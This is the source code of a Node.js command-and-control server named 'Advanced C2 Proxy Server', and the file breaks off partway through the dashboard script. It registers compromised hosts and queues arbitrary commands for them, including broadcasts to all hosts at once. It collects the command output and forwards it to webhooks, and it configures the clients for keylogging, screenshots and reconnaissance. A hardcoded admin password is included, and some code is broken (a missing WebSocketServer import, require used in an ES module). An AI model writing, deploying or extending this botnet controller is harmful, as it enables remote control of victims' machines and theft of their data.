import express from 'express';
import crypto from 'crypto';
import cors from 'cors';
import compression from 'compression';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import WebSocket from 'ws';
import http from 'http';

// ==================== CONFIGURATION ====================
const PORT = process.env.PORT || 8080;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'monitorMutexCPUman';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '`f7`8b`c.519e`7ba57f6~s';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

// Log configuration on startup
console.log('🚀 Starting Advanced C2 Proxy Server...');
console.log(`🔐 Encryption Key: ${ENCRYPTION_KEY.substring(0, 16)}...`);
console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);

// ==================== ENCRYPTION ====================
class CryptoManager {
    constructor(key) {
        this.key = Buffer.from(key, 'utf8');
        this.algorithm = 'aes-256-gcm';
    }

    encrypt(data) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
        encrypted += cipher.final('base64');
        const authTag = cipher.getAuthTag();
        return { 
            iv: iv.toString('base64'), 
            data: encrypted,
            authTag: authTag.toString('base64')
        };
    }

    decrypt(encryptedObj) {
        const iv = Buffer.from(encryptedObj.iv, 'base64');
        const authTag = Buffer.from(encryptedObj.authTag, 'base64');
        const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv);
        decipher.setAuthTag(authTag);
        let decrypted = decipher.update(encryptedObj.data, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    }

    generateToken() {
        return crypto.randomBytes(32).toString('hex');
    }

    hashPassword(password) {
        const salt = crypto.randomBytes(16).toString('hex');
        const hash = crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');
        return { salt, hash };
    }

    verifyPassword(password, storedSalt, storedHash) {
        const hash = crypto.pbkdf2Sync(password, storedSalt, 1000, 64, 'sha512').toString('hex');
        return hash === storedHash;
    }
}

const cryptoManager = new CryptoManager(ENCRYPTION_KEY);

// ==================== EXPRESS APP ====================
const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));
app.use(compression());
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// ==================== RATE LIMITING ====================
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ==================== IN-MEMORY STORAGE (with persistence to disk) ====================
class StoreManager {
    constructor() {
        this.cache = new Map();
        this.cacheTTL = 30000; // 30 seconds
        this.persistInterval = 60000; // Save to disk every minute
        this.dataFile = './data.json';
        this.loadFromDisk();
        
        // Auto-save to disk
        setInterval(() => this.saveToDisk(), this.persistInterval);
    }

    loadFromDisk() {
        try {
            const fs = require('fs');
            if (fs.existsSync(this.dataFile)) {
                const data = JSON.parse(fs.readFileSync(this.dataFile, 'utf8'));
                for (const [key, value] of Object.entries(data)) {
                    this.cache.set(key, { value, timestamp: Date.now() });
                }
                console.log(`📂 Loaded ${this.cache.size} items from disk`);
            }
        } catch (err) {
            console.log('No existing data file found, starting fresh');
        }
    }

    saveToDisk() {
        try {
            const fs = require('fs');
            const data = {};
            for (const [key, entry] of this.cache) {
                data[key] = entry.value;
            }
            fs.writeFileSync(this.dataFile, JSON.stringify(data, null, 2));
        } catch (err) {
            // Silently fail - data stays in memory
        }
    }

    async set(key, value) {
        this.cache.set(key, { value, timestamp: Date.now() });
        return true;
    }

    async get(key) {
        const cached = this.cache.get(key);
        if (cached && (Date.now() - cached.timestamp) < this.cacheTTL) {
            return cached.value;
        }
        return cached ? cached.value : null;
    }

    async delete(key) {
        this.cache.delete(key);
        return true;
    }

    async list(pattern) {
        const keys = Array.from(this.cache.keys());
        if (pattern) {
            const regex = new RegExp(pattern.replace('*', '.*'));
            return keys.filter(k => regex.test(k));
        }
        return keys;
    }

    async search(prefix) {
        const keys = await this.list(prefix + '*');
        const results = [];
        for (const key of keys) {
            const value = await this.get(key);
            if (value) {
                results.push({ key, value });
            }
        }
        return results;
    }

    async getAll() {
        const data = {};
        for (const [key, entry] of this.cache) {
            data[key] = entry.value;
        }
        return data;
    }
}

const store = new StoreManager();

// ==================== AUTHENTICATION ====================
let adminTokens = [];

async function authenticate(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = authHeader.substring(7);
    
    // Check token
    const validTokens = await store.get('admin_tokens') || [];
    if (validTokens.includes(token)) {
        return next();
    }
    
    // Check session
    const session = await store.get(`session:${token}`);
    if (session && session.expires > Date.now()) {
        return next();
    }
    
    res.status(401).json({ error: 'Invalid or expired token' });
}

async function generateAdminToken() {
    const token = cryptoManager.generateToken();
    const tokens = await store.get('admin_tokens') || [];
    tokens.push(token);
    await store.set('admin_tokens', tokens);
    return token;
}

// Generate initial token
generateAdminToken().then(token => {
    console.log(`🔑 Admin Token: ${token}`);
});

// ==================== WEBHOOKS ====================
class WebhookManager {
    constructor(store) {
        this.store = store;
    }

    async register(webhook) {
        const webhooks = await this.store.get('webhooks') || [];
        webhooks.push({
            id: cryptoManager.generateToken().slice(0, 8),
            url: webhook.url,
            events: webhook.events || ['command_result', 'client_online', 'client_offline'],
            secret: webhook.secret || cryptoManager.generateToken(),
            created: new Date().toISOString()
        });
        await this.store.set('webhooks', webhooks);
        return webhooks[webhooks.length - 1];
    }

    async trigger(event, data) {
        const webhooks = await this.store.get('webhooks') || [];
        for (const webhook of webhooks) {
            if (webhook.events.includes(event)) {
                try {
                    const payload = JSON.stringify({
                        event,
                        data,
                        timestamp: new Date().toISOString()
                    });
                    
                    const hmac = crypto.createHmac('sha256', webhook.secret);
                    hmac.update(payload);
                    const signature = hmac.digest('hex');
                    
                    await fetch(webhook.url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Signature': signature
                        },
                        body: payload
                    });
                } catch (err) {
                    console.error(`Webhook error for ${webhook.url}:`, err.message);
                }
            }
        }
    }
}

const webhookManager = new WebhookManager(store);

// ==================== CLIENT MANAGEMENT ====================
class ClientManager {
    constructor(store, webhookManager) {
        this.store = store;
        this.webhookManager = webhookManager;
        this.clients = new Map();
        this.onlineThreshold = 300000; // 5 minutes
    }

    async register(data) {
        const { clientId, hostname, username, ip } = data;
        
        const clientData = {
            clientId,
            hostname: hostname || 'unknown',
            username: username || 'unknown',
            ip: ip || 'unknown',
            registered: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            status: 'online',
            tags: [],
            notes: '',
            totalCommands: 0,
            lastCommand: null,
            features: ['cmd', 'powershell', 'file', 'network', 'keylogger', 'screenshot', 'recon']
        };
        
        await this.store.set(`client:${clientId}`, clientData);
        
        // Add to clients list
        const clients = await this.store.get('clients') || [];
        if (!clients.includes(clientId)) {
            clients.push(clientId);
            await this.store.set('clients', clients);
        }
        
        // Trigger webhook
        await this.webhookManager.trigger('client_online', clientData);
        
        console.log(`✅ Client registered: ${clientId} (${hostname}/${username})`);
        
        return clientData;
    }

    async heartbeat(clientId) {
        const client = await this.store.get(`client:${clientId}`);
        if (!client) return null;
        
        client.lastSeen = new Date().toISOString();
        client.status = 'online';
        await this.store.set(`client:${clientId}`, client);
        
        this.clients.set(clientId, client);
        return client;
    }

    async getPendingCommands(clientId) {
        const commands = await this.store.get(`pending:${clientId}`) || [];
        return commands;
    }

    async getStats() {
        const clients = await this.store.get('clients') || [];
        const stats = {
            total: clients.length,
            online: 0,
            offline: 0,
            lastHour: 0
        };
        
        const now = Date.now();
        for (const id of clients) {
            const client = await this.store.get(`client:${id}`);
            if (client) {
                const lastSeen = new Date(client.lastSeen).getTime();
                if (now - lastSeen < this.onlineThreshold) {
                    stats.online++;
                } else {
                    stats.offline++;
                }
                if (now - lastSeen < 3600000) {
                    stats.lastHour++;
                }
            }
        }
        
        return stats;
    }

    async getCommandHistory(clientId, limit = 50) {
        const history = await this.store.get(`history:${clientId}`) || [];
        return history.slice(-limit);
    }
}

const clientManager = new ClientManager(store, webhookManager);

// ==================== ANALYTICS ENGINE ====================
class AnalyticsEngine {
    constructor(store) {
        this.store = store;
        this.events = [];
    }

    async log(eventType, data) {
        const event = {
            id: Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex'),
            type: eventType,
            data,
            timestamp: new Date().toISOString()
        };
        
        const key = `event:${event.id}`;
        await this.store.set(key, event);
        
        const events = await this.store.get('events') || [];
        events.push(key);
        if (events.length > 10000) {
            const old = events.shift();
            await this.store.delete(old);
        }
        await this.store.set('events', events);
        
        this.events.push(event);
        return event;
    }

    async getMetrics(timeRange = '24h') {
        const events = await this.store.get('events') || [];
        const metrics = {
            totalEvents: 0,
            commandExecutions: 0,
            uniqueClients: 0,
            errors: 0,
            commands: {},
            timeline: {}
        };
        
        const cutoff = new Date();
        if (timeRange === '24h') cutoff.setHours(cutoff.getHours() - 24);
        else if (timeRange === '7d') cutoff.setDate(cutoff.getDate() - 7);
        else if (timeRange === '30d') cutoff.setDate(cutoff.getDate() - 30);
        
        const clients = new Set();
        
        for (const key of events) {
            const event = await this.store.get(key);
            if (!event) continue;
            
            const eventTime = new Date(event.timestamp);
            if (eventTime < cutoff) continue;
            
            metrics.totalEvents++;
            
            if (event.type === 'command_executed') {
                metrics.commandExecutions++;
                const cmd = event.data.command || 'unknown';
                metrics.commands[cmd] = (metrics.commands[cmd] || 0) + 1;
                
                const hour = eventTime.getHours();
                metrics.timeline[hour] = (metrics.timeline[hour] || 0) + 1;
            }
            
            if (event.data.clientId) {
                clients.add(event.data.clientId);
            }
            
            if (event.type === 'error') {
                metrics.errors++;
            }
        }
        
        metrics.uniqueClients = clients.size;
        return metrics;
    }

    async getHeatmap() {
        const metrics = await this.getMetrics('30d');
        const heatmap = [];
        
        for (let hour = 0; hour < 24; hour++) {
            const count = metrics.timeline[hour] || 0;
            const normalized = Math.min(count / 10, 1);
            heatmap.push({
                hour,
                count,
                intensity: normalized
            });
        }
        
        return heatmap;
    }
}

const analytics = new AnalyticsEngine(store);

// ==================== API ENDPOINTS ====================

// Health Check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        time: new Date().toISOString(),
        version: '3.0.0',
        clients: clientManager.clients.size,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        platform: 'Render.com'
    });
});

// Root
app.get('/', (req, res) => {
    res.json({
        name: 'Advanced C2 Proxy Server',
        version: '3.0.0',
        status: 'running',
        platform: 'Render.com',
        endpoints: {
            health: '/health',
            dashboard: '/dashboard',
            register: 'POST /api/register',
            poll: 'POST /api/poll',
            results: 'POST /api/results',
            heartbeat: 'POST /api/heartbeat',
            clients: 'GET /api/admin/clients',
            command: 'POST /api/admin/command',
            analytics: 'GET /api/admin/analytics'
        }
    });
});

// ==================== CLIENT API ====================

app.post('/api/register', async (req, res) => {
    try {
        const { clientId, hostname, username, ip } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        const clientData = await clientManager.register({
            clientId,
            hostname,
            username,
            ip
        });
        
        const commands = await clientManager.getPendingCommands(clientId);
        
        // Clear pending commands
        await store.delete(`pending:${clientId}`);
        
        const response = cryptoManager.encrypt({
            status: 'registered',
            clientId,
            commands,
            config: {
                pollingInterval: 2000,
                heartbeatInterval: 300000,
                keyloggerEnabled: true,
                screenshotEnabled: true,
                reconEnabled: true
            }
        });
        
        await analytics.log('client_registered', { clientId, hostname, username, ip });
        
        res.json(response);
    } catch (err) {
        console.error('Registration error:', err);
        await analytics.log('error', { endpoint: '/register', error: err.message });
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/poll', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        // Decrypt and process
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        // Update client heartbeat
        await clientManager.heartbeat(clientId);
        
        // Get pending commands
        const commands = await clientManager.getPendingCommands(clientId);
        
        // Clear pending commands
        await store.delete(`pending:${clientId}`);
        
        // Log analytics
        await analytics.log('poll', { clientId, commandCount: commands.length });
        
        const response = cryptoManager.encrypt({
            status: 'success',
            commands
        });
        
        res.json(response);
    } catch (err) {
        console.error('Poll error:', err);
        await analytics.log('error', { endpoint: '/poll', error: err.message });
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/results', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        // Decrypt data
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        const { commandId, output, status, duration, error } = data;
        
        // Store result
        const resultKey = `result:${clientId}:${commandId || Date.now()}`;
        const resultData = {
            clientId,
            commandId: commandId || Date.now(),
            output,
            status: status || 'completed',
            duration: duration || 0,
            error: error || null,
            timestamp: new Date().toISOString()
        };
        
        await store.set(resultKey, resultData);
        
        // Add to results list
        const results = await store.get(`results:${clientId}`) || [];
        results.push(resultKey);
        if (results.length > 100) {
            const old = results.shift();
            await store.delete(old);
        }
        await store.set(`results:${clientId}`, results);
        
        // Log analytics
        await analytics.log('command_result', { 
            clientId, 
            commandId, 
            status,
            outputLength: output ? output.length : 0
        });
        
        // Trigger webhook
        await webhookManager.trigger('command_result', {
            clientId,
            commandId,
            output,
            status
        });
        
        const response = cryptoManager.encrypt({
            status: 'success',
            message: 'Results stored'
        });
        
        res.json(response);
    } catch (err) {
        console.error('Results error:', err);
        await analytics.log('error', { endpoint: '/results', error: err.message });
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/heartbeat', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        await clientManager.heartbeat(clientId);
        await analytics.log('heartbeat', { clientId });
        
        res.json({ status: 'success' });
    } catch (err) {
        console.error('Heartbeat error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ==================== ADMIN API ====================

// Login - Get admin token
app.post('/api/admin/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
            const token = await generateAdminToken();
            res.json({ 
                status: 'success', 
                token,
                expiresIn: 86400 // 24 hours
            });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get all clients
app.get('/api/admin/clients', authenticate, async (req, res) => {
    try {
        const clients = await store.get('clients') || [];
        const clientData = [];
        
        for (const id of clients) {
            const data = await store.get(`client:${id}`);
            if (data) {
                const pending = await store.get(`pending:${id}`) || [];
                const results = await store.get(`results:${id}`) || [];
                data.pendingCommands = pending.length;
                data.resultsCount = results.length;
                clientData.push(data);
            }
        }
        
        clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
        
        res.json({ clients: clientData });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get client details
app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const client = await store.get(`client:${clientId}`);
        if (!client) {
            return res.status(404).json({ error: 'Client not found' });
        }
        
        const pending = await store.get(`pending:${clientId}`) || [];
        const results = await store.get(`results:${clientId}`) || [];
        const history = await store.get(`history:${clientId}`) || [];
        
        const fullResults = [];
        for (const key of results.slice(-20)) {
            const result = await store.get(key);
            if (result) {
                fullResults.push(result);
            }
        }
        
        res.json({
            client,
            pending: pending.length,
            results: fullResults,
            history: history.slice(-20)
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Send command to client
app.post('/api/admin/command', authenticate, async (req, res) => {
    try {
        const { clientId, command, scheduled, delay } = req.body;
        
        if (!clientId || !command) {
            return res.status(400).json({ error: 'clientId and command required' });
        }
        
        const commandId = Date.now().toString();
        const commandEntry = {
            id: commandId,
            command,
            timestamp: new Date().toISOString(),
            status: 'pending',
            scheduled: scheduled || null,
            delay: delay || 0
        };
        
        if (scheduled) {
            commandEntry.scheduledTime = new Date(scheduled).toISOString();
        }
        
        const pendingCommands = await store.get(`pending:${clientId}`) || [];
        pendingCommands.push(commandEntry);
        await store.set(`pending:${clientId}`, pendingCommands);
        
        const history = await store.get(`history:${clientId}`) || [];
        history.push({
            id: commandId,
            command,
            timestamp: new Date().toISOString(),
            status: 'sent'
        });
        if (history.length > 100) {
            history.shift();
        }
        await store.set(`history:${clientId}`, history);
        
        await analytics.log('command_sent', { clientId, commandId, command });
        
        await webhookManager.trigger('command_sent', {
            clientId,
            commandId,
            command
        });
        
        res.json({ 
            status: 'success', 
            commandId,
            scheduled: scheduled || false
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Broadcast command to all clients
app.post('/api/admin/broadcast', authenticate, async (req, res) => {
    try {
        const { command } = req.body;
        if (!command) {
            return res.status(400).json({ error: 'command required' });
        }
        
        const clients = await store.get('clients') || [];
        const results = [];
        
        for (const clientId of clients) {
            const commandId = Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex');
            const commandEntry = {
                id: commandId,
                command,
                timestamp: new Date().toISOString(),
                status: 'pending'
            };
            
            const pendingCommands = await store.get(`pending:${clientId}`) || [];
            pendingCommands.push(commandEntry);
            await store.set(`pending:${clientId}`, pendingCommands);
            
            results.push({ clientId, commandId });
        }
        
        await analytics.log('broadcast', { command, clientCount: clients.length });
        
        res.json({
            status: 'success',
            broadcasted: results.length,
            clients: results
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get results for client
app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const { limit = 50, offset = 0 } = req.query;
        
        const resultKeys = await store.get(`results:${clientId}`) || [];
        const results = [];
        
        const start = resultKeys.length - parseInt(limit) - parseInt(offset);
        const end = resultKeys.length - parseInt(offset);
        
        for (let i = start; i < end && i >= 0; i++) {
            const data = await store.get(resultKeys[i]);
            if (data) {
                results.push(data);
            }
        }
        
        res.json({ 
            results: results.reverse(),
            total: resultKeys.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Delete client
app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        
        const clients = await store.get('clients') || [];
        const index = clients.indexOf(clientId);
        if (index > -1) {
            clients.splice(index, 1);
            await store.set('clients', clients);
        }
        
        await store.delete(`client:${clientId}`);
        await store.delete(`pending:${clientId}`);
        await store.delete(`history:${clientId}`);
        await store.delete(`results:${clientId}`);
        
        await analytics.log('client_deleted', { clientId });
        
        res.json({ status: 'success', message: 'Client deleted' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== ANALYTICS API ====================

app.get('/api/admin/analytics', authenticate, async (req, res) => {
    try {
        const { range = '24h' } = req.query;
        const metrics = await analytics.getMetrics(range);
        const heatmap = await analytics.getHeatmap();
        const stats = await clientManager.getStats();
        
        res.json({
            stats,
            metrics,
            heatmap,
            timestamp: new Date().toISOString()
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== WEBHOOKS API ====================

app.post('/api/admin/webhooks', authenticate, async (req, res) => {
    try {
        const { url, events, secret } = req.body;
        if (!url) {
            return res.status(400).json({ error: 'url required' });
        }
        
        const webhook = await webhookManager.register({ url, events, secret });
        res.json({ status: 'success', webhook });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/webhooks', authenticate, async (req, res) => {
    try {
        const webhooks = await store.get('webhooks') || [];
        res.json({ webhooks });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== SCHEDULED TASKS ====================

class Scheduler {
    constructor(store) {
        this.store = store;
        this.tasks = new Map();
    }

    async schedule(clientId, command, time, options = {}) {
        const taskId = crypto.randomBytes(8).toString('hex');
        const task = {
            id: taskId,
            clientId,
            command,
            scheduledTime: new Date(time).toISOString(),
            created: new Date().toISOString(),
            options,
            status: 'scheduled'
        };
        
        await this.store.set(`task:${taskId}`, task);
        
        const tasks = await this.store.get('tasks') || [];
        tasks.push(taskId);
        await this.store.set('tasks', tasks);
        
        return task;
    }

    async check() {
        const tasks = await this.store.get('tasks') || [];
        const now = new Date();
        
        for (const taskId of tasks) {
            const task = await this.store.get(`task:${taskId}`);
            if (!task || task.status !== 'scheduled') continue;
            
            const scheduledTime = new Date(task.scheduledTime);
            if (scheduledTime <= now) {
                const commands = await this.store.get(`pending:${task.clientId}`) || [];
                commands.push({
                    id: Date.now().toString(),
                    command: task.command,
                    timestamp: new Date().toISOString(),
                    status: 'pending',
                    scheduled: true
                });
                await this.store.set(`pending:${task.clientId}`, commands);
                
                task.status = 'executed';
                task.executedAt = new Date().toISOString();
                await this.store.set(`task:${taskId}`, task);
                
                console.log(`✅ Scheduled task ${taskId} executed for ${task.clientId}`);
            }
        }
    }
}

const scheduler = new Scheduler(store);

// Start scheduler
setInterval(async () => {
    await scheduler.check();
}, 60000);

// ==================== WEBSOCKET HANDLER ====================

const wsClients = new Map();

wss.on('connection', (ws, req) => {
    console.log('🔌 WebSocket client connected');
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.type === 'auth') {
                const valid = await store.get('admin_tokens') || [];
                if (valid.includes(data.token)) {
                    ws.send(JSON.stringify({ type: 'auth_success' }));
                    return;
                }
                ws.send(JSON.stringify({ type: 'auth_failed' }));
                return;
            }
            
            if (data.type === 'subscribe') {
                const { clientId } = data;
                wsClients.set(ws, { clientId, subscribed: true });
                ws.send(JSON.stringify({ 
                    type: 'subscribed', 
                    clientId,
                    message: `Subscribed to ${clientId}`
                }));
                
                const client = await store.get(`client:${clientId}`);
                const results = await store.get(`results:${clientId}`) || [];
                const pending = await store.get(`pending:${clientId}`) || [];
                
                ws.send(JSON.stringify({
                    type: 'initial_data',
                    client,
                    results: results.slice(-10),
                    pending
                }));
            }
            
            if (data.type === 'command') {
                const { clientId, command } = data;
                const pending = await store.get(`pending:${clientId}`) || [];
                pending.push({
                    id: Date.now().toString(),
                    command,
                    timestamp: new Date().toISOString(),
                    status: 'pending'
                });
                await store.set(`pending:${clientId}`, pending);
                
                ws.send(JSON.stringify({
                    type: 'command_sent',
                    clientId,
                    command
                }));
            }
            
        } catch (err) {
            console.error('WebSocket error:', err);
            ws.send(JSON.stringify({ type: 'error', message: err.message }));
        }
    });
    
    ws.on('close', () => {
        wsClients.delete(ws);
        console.log('🔌 WebSocket client disconnected');
    });
});

// ==================== DASHBOARD ====================

app.get('/dashboard', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Advanced C2 Proxy Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .badge { background: #00ff8822; color: #00ff88; padding: 5px 15px; border-radius: 20px; font-size: 14px; }
        .card { background: #141d2b; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #1e2d3d; }
        .card h2 { color: #00ff88; margin-bottom: 15px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat-card { background: #1a2535; padding: 15px; border-radius: 8px; text-align: center; }
        .stat-card .number { font-size: 32px; font-weight: bold; color: #00ff88; }
        .stat-card .label { color: #8899aa; font-size: 12px; text-transform: uppercase; margin-top: 5px; }
        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
        .client-card { background: #1a2535; padding: 15px; border-radius: 8px; border-left: 3px solid #00ff88; cursor: pointer; transition: all 0.3s; }
        .client-card:hover { background: #1e2d3d; transform: translateX(5px); }
        .client-card .id { color: #00ff88; font-weight: bold; font-size: 16px; }
        .client-card .detail { color: #8899aa; font-size: 0.9em; margin: 2px 0; }
        .status { display: inline-block; padding: 2px 10px; border-radius: 4px; font-size: 0.8em; margin-top: 5px; }
        .status.online { background: #00ff8822; color: #00ff88; }
        .status.offline { background: #ff444422; color: #ff4444; }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
        .flex > * { flex: 1; min-width: 200px; }
        input, select, textarea { background: #0a0e17; color: #e0e0e0; border: 1px solid #1e2d3d; padding: 10px; border-radius: 5px; width: 100%; margin-bottom: 10px; font-family: inherit; }
        button { background: #00ff88; color: #0a0e17; border: none; padding: 10px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
        button:hover { background: #00cc66; transform: scale(1.02); }
        button.secondary { background: #1e2d3d; color: #e0e0e0; }
        button.secondary:hover { background: #2a3d4d; }
        .output { background: #0a0e17; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; white-space: pre-wrap; max-height: 400px; overflow-y: auto; font-size: 12px; }
        .loading { color: #ffaa00; }
        .error { color: #ff4444; }
        .success { color: #00ff88; }
        .help-text { color: #8899aa; font-size: 12px; margin-top: 5px; }
        .command-history { max-height: 300px; overflow-y: auto; }
        .command-entry { padding: 5px 10px; border-bottom: 1px solid #1e2d3d; font-size: 13px; }
        .command-entry .cmd { color: #00ff88; }
        .command-entry .time { color: #8899aa; font-size: 11px; float: right; }
        @media (max-width: 600px) { .flex { flex-direction: column; } }
    </style>
</head>
<body>
<div class="container">
    <h1>
        🎯 Advanced C2 Proxy Dashboard
        <span class="badge">v3.0.0</span>
    </h1>
    
    <div class="card">
        <h2>📡 Server Status</h2>
        <div id="serverStatus">Loading...</div>
        <button onclick="refreshAll()" class="secondary">🔄 Refresh</button>
    </div>
    
    <div class="card">
        <h2>📊 Statistics</h2>
        <div class="stats-grid" id="statsGrid">
            <div class="stat-card"><div class="number" id="statTotal">0</div><div class="label">Total Clients</div></div>
            <div class="stat-card"><div class="number" id="statOnline">0</div><div class="label">Online</div></div>
            <div class="stat-card"><div class="number" id="statOffline">0</div><div class="label">Offline</div></div>
            <div class="stat-card"><div class="number" id="statCommands">0</div><div class="label">Commands Executed</div></div>
        </div>
    </div>
    
    <div class="card">
        <h2>🖥️ Connected Clients</h2>
        <div id="clientList" class="client-grid">Loading clients...</div>
    </div>
    
    <div class="card">
        <h2>📤 Send Command</h2>
        <div class="flex">
            <input type="text" id="targetClient" placeholder="Client ID (e.g., TEST001)">
            <input type="text" id="commandInput" placeholder="Command to execute">
        </div>
        <div class="flex">
            <input type="datetime-local" id="scheduleTime" placeholder="Schedule time (optional)">
            <button onclick="sendCommand()">▶ Execute</button>
            <button onclick="broadcastCommand()" class="secondary">📢 Broadcast to All</button>
        </div>
        <div id="commandStatus" class="help-text"></div>
    </div>
    
    <div class="card">
        <h2>📋 Command Output</h2>
        <div id="commandOutput" class="output">Select a client to view results...</div>
    </div>
    
    <div class="card">
        <h2>📜 Command History</h2>
        <div id="commandHistory" class="command-history">No history yet...</div>
    </div>
    
    <div class="card">
        <h2>🔑 Authentication</h2>
        <div class="flex">
            <input type="text" id="authUsername" placeholder="Username" value="admin">
            <input type="password" id="authPassword" placeholder="Password">
            <button onclick="login()">🔑 Login</button>
        </div>
        <div id="authStatus" class="help-text"></div>
        <div id="authTokenDisplay" style="display:none; margin-top:10px; background:#0a0e17; padding:10px; border-radius:5px; word-break:break-all; font-family:monospace; font-size:12px;"></div>
    </div>
</div>

<script>
    let authToken = '';
    let selectedClient = null;
    const API_BASE = window.location.origin;
    
    function login() {
        const username = document.getElementById('authUsername').value;
        const password = document.getElementById('authPassword').value;
        
        fetch(API_BASE + '/api/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        })
        .then(res => res.json())
        .then(data => {
            if (data.token) {
                authToken = data.token;
                document.getElementById('authStatus').innerHTML = '✅ Login successful!';
                document.getElementById('authTokenDisplay').style.display = 'block';
                document.getElementById('authTokenDisplay').textContent = 'Token: ' + data.token;
                localStorage.setItem('authToken', data.token);
                refreshAll();
            } else {
                document.getElementById('authStatus').innerHTML = '❌ ' + (data.error || 'Login failed');
            }
        })
        .catch(err => {
            document.getElementById('authStatus').innerHTML = '❌ Error: ' + err.message;
        });
    }
    
    // Load saved token
    const savedToken = localStorage.getItem('authToken');
    if (savedToken) {
        authToken = savedToken;
        document.getElementById('authTokenDisplay').style.display = 'block';
        document.getElementById('authTokenDisplay').textContent = 'Token: ' + savedToken;
        document.getElementById('authStatus').innerHTML = '✅ Loaded saved token';
        refreshAll();
    }
    
    function getHeaders() {
        return {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + authToken
        };
    }
    
    function refreshAll() {
        checkHealth();
        loadClients();
        loadAnalytics();
    }
    
    function checkHealth() {
        fetch(API_BASE + '/health')
            .then(res => res.json())
            .then(data => {
                document.getElementById('serverStatus').innerHTML = \`
                    <span class="success">✅ Online</span>
                    | Clients: <strong>\${data.clients}</strong>
                    | Uptime: <strong>\${Math.floor(data.uptime / 60)}m</strong>
                    | Version: <strong>\${data.version}</strong>
                    | Platform: <strong>\${data.platform || 'Render'}</strong>
                \`;
            })
            .catch(err => {
                document.getElementById('serverStatus').innerHTML = '❌ Error: ' + err.message;
            });
    }
    
    function loadClients() {
